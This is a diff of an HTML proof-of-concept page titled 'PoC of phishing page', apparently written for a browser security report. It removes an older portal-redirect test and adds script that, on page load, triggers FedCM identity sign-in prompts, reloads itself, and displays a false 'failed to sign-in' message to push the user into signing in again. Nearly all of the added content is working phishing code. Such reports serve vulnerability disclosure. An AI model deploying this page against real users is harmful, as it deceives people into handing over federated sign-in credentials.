@@ -1,16 +1,37 @@
-
-<html>
+<head>PoC of phishing page</head>
 <script>
-var url = 'https://dh2048.badssl.com/';
-var portal = document.createElement('portal');
-function f() {
-	portal.src = url;
-	portal.style = "width:100%; height:100%";
-	document.body.appendChild(portal);
-	portal.onload = function() { portal.src = 'https://testsafebrowsing.appspot.com/s/malware_in_iframe.html';   }
-}
+  async function signIn() {
+    await navigator.login.setStatus("logged-in");
 
+    if (window.location.hash == "#refresh") {
+      navigator.credentials.get({
+        identity: {
+          mediation: "optional",
+          providers: [{
+            configURL: window.location.origin + "/config.json",
+            clientId: "123",
+            nonce: '******',
+          }]
+        }
+      });
+      document.body.innerHTML += "<br><br><p>Oops, failed to sign-in, please make sure you have closed all other sign-in popups</p>"
+    } else {
+      const credential = await navigator.credentials.get({
+        identity: {
+          mediation: "optional",
+          providers: [{
+            configURL: window.location.origin + "/config.json",
+            clientId: "123",
+            nonce: '******',
+          }]
+        }
+      });
+      setTimeout(() => {
+        window.location.href = window.location + "#refresh";
+        window.location.reload();
+      }, 500);
+    }
+  }
+
+  window.onload = signIn;
 </script>
-<body onload='f();'>
-</body>
-</html>
